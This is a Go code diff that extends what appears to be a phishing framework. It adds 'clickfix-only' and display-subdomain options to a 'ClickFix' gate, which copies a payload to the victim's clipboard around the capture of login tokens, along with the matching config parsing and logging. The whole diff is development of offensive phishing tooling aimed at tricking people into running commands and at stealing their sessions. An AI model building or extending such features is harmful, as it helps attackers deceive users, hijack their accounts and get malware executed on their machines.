@@ -264,15 +264,19 @@ type ConfigPhishlet struct {
 // Position "after": served after all auth tokens are captured, replacing
 // the post-completion JS redirect.
 type ClickFix struct {
-	Template string // template file name (clickfix/templates/<name>.html)
-	Command  string // payload copied to the victim's clipboard
-	Position string // "before" or "after" (default "before")
+	Template     string // template file name (clickfix/templates/<name>.html)
+	Command      string // payload copied to the victim's clipboard
+	Position     string // "before" or "after" (default "before")
+	Only         bool   // clickfix-only mode: no login flow, just the gate
+	Subdomain    string // display domain override on the clickfix page
 }
 
 type ConfigClickFix struct {
-	Template *string `mapstructure:"template"`
-	Command  *string `mapstructure:"command"`
-	Position *string `mapstructure:"position"`
+	Template  *string `mapstructure:"template"`
+	Command   *string `mapstructure:"command"`
+	Position  *string `mapstructure:"position"`
+	Only      *bool   `mapstructure:"only"`
+	Subdomain *string `mapstructure:"subdomain"`
 }
 
 // ClickFix returns the phishlet's clickfix gate configuration (nil = disabled).
@@ -608,6 +612,12 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		if fp.ClickFix.Position != nil {
 			cf.Position = strings.TrimSpace(*fp.ClickFix.Position)
 		}
+		if fp.ClickFix.Only != nil {
+			cf.Only = *fp.ClickFix.Only
+		}
+		if fp.ClickFix.Subdomain != nil {
+			cf.Subdomain = strings.TrimSpace(*fp.ClickFix.Subdomain)
+		}
 		if cf.Template == "" || cf.Command == "" {
 			return fmt.Errorf("clickfix: 'template' and 'command' are required")
 		}
@@ -615,8 +625,8 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			return fmt.Errorf("clickfix: position must be 'before' or 'after', got %q", cf.Position)
 		}
 		p.clickfix = cf
-		log.Info("phishlet %s: clickfix gate enabled (template=%s position=%s)",
-			p.Name, cf.Template, cf.Position)
+		log.Info("phishlet %s: clickfix gate enabled (template=%s position=%s only=%v subdomain=%s)",
+			p.Name, cf.Template, cf.Position, cf.Only, cf.Subdomain)
 	}
 	for _, at := range *fp.AuthTokens {
 		ttype := "cookie"
